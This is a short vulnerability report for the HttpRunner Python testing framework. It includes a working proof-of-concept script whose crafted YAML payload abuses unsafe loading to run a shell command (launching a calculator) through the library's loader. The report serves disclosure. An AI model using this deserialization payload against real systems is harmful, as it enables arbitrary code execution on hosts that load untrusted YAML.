# Description

`HttpRunner` is a simple & elegant, yet powerful HTTP(S) testing framework.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

### Installation
```bash
pip3 install httprunner
```

### Run exploit.py
```
import os
#os.system('pip3 install httprunner')
from httprunner import loader
exploit = """!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('pwn.yml','w+').write(exploit)
loader._load_yaml_file('pwn.yml')
```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
